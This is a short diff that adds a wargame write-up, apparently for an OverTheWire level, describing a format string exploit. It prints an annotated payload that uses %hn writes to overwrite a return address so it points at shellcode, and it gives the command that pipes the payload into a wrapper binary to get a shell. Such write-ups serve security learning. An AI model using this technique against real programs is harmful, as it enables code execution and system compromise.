@@ -1,0 +1,13 @@
+Standard format string exploit!!!
+
+For a more formal explanation, check my narnia 7 writeup
+
+print(b'AAAA\x1e\xde\xff\xff\x1c\xde\xff\xff%57272x%3$hn%8251x%2$hn')
+	 ^ 	   ^	       ^             ^
+        lil buffer |	       |	     |
+    return address high order  |	     |
+	     return address low order        |
+	write 0xffff to high order, then 0xdfc4 (holds shellcode) to low order
+	makes whole return address point to shellcode!
+
+Like behemoth1, executing "(python2 payload.py && cat) | ./b3wrapper" gets a shell.
